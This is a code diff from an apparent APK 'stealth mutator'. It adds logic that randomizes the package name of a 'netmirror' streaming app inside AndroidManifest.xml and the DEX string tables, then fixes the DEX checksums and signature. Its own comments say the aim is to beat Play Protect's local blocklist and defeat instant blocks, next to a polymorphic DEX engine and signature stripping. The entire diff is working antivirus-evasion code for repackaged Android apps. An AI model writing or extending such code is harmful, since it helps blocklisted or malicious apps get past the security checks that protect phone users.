@@ -2805,6 +2805,51 @@ function mutateAndSignStealth(originalBuffer) {
   try {
     const zip = new AdmZip(originalBuffer);
     stripSignatures(zip);
+
+    // ── ALWAYS: Package name randomization (runs even when poly engine is bypassed) ──
+    // PP checks package name from LOCAL on-device blocklist BEFORE any cloud scan.
+    // Randomizing here guarantees the fallback path also defeats instant blocks.
+    try {
+      const _pool = ['video','media','stream','player','cast','view','watch','play',
+                     'hub','app','pro','max','plus','now','hd','live','net','go'];
+      function _seg(n) { let r=''; while(r.length<n) r+=_pool[Math.floor(Math.random()*_pool.length)]; return r.substring(0,n); }
+      const s1=_seg(9), s2=_seg(9), ndot=`com.${s1}.${s2}`, nsl=`com/${s1}/${s2}`;
+      // Manifest
+      const mE=zip.getEntry('AndroidManifest.xml');
+      if(mE){
+        const mB=Buffer.from(mE.getData());
+        function _r(os,ns){
+          if(os.length!==ns.length)return;
+          const ob=Buffer.alloc(os.length*2),nb=Buffer.alloc(ns.length*2);
+          for(let i=0;i<os.length;i++){ob.writeUInt16LE(os.charCodeAt(i),i*2);nb.writeUInt16LE(ns.charCodeAt(i),i*2);}
+          let p=0;while((p=mB.indexOf(ob,p))!==-1){nb.copy(mB,p);p+=ob.length;}
+          const ob8=Buffer.from(os,'utf8'),nb8=Buffer.from(ns,'utf8');
+          p=0;while((p=mB.indexOf(ob8,p))!==-1){nb8.copy(mB,p);p+=nb8.length;}
+        }
+        _r('com.netmirror.streaming',ndot);_r('com/netmirror/streaming',nsl);
+        _r('netmirror.streaming',`${s1}.${s2}`);_r('netmirror/streaming',`${s1}/${s2}`);
+        _r('netmirror',s1);
+        zip.deleteFile('AndroidManifest.xml');zip.addFile('AndroidManifest.xml',mB);
+        console.log(`[Mutator-Stealth] PKG randomized → ${ndot}`);
+      }
+      // DEX: patch 'netmirror' in string table
+      for(const de of zip.getEntries().filter(e=>/^classes\d*\.dex$/.test(e.entryName))){
+        try{
+          const db=Buffer.from(de.getData());
+          const ob=Buffer.from('netmirror','utf8'),nb=Buffer.from(s1,'utf8');
+          let p=0,c=0;while((p=db.indexOf(ob,p))!==-1){nb.copy(db,p);c++;p+=nb.length;}
+          if(c>0){
+            const fs=db.readUInt32LE(DEX_FILE_SIZE_OFF);
+            if(fs<=db.length){
+              crypto.createHash('sha1').update(db.slice(32,fs)).digest().copy(db,DEX_SIGNATURE_OFF);
+              db.writeUInt32LE(adler32(db.slice(12,fs)),DEX_CHECKSUM_OFF);
+            }
+            zip.updateFile(de,db);
+          }
+        }catch(_){}
+      }
+    } catch(e){console.warn('[Mutator-Stealth] PKG patch err:',e.message);}
+
     const dexCount = mutateDexStealth(zip);
 
     const key = generateHardenedKey();
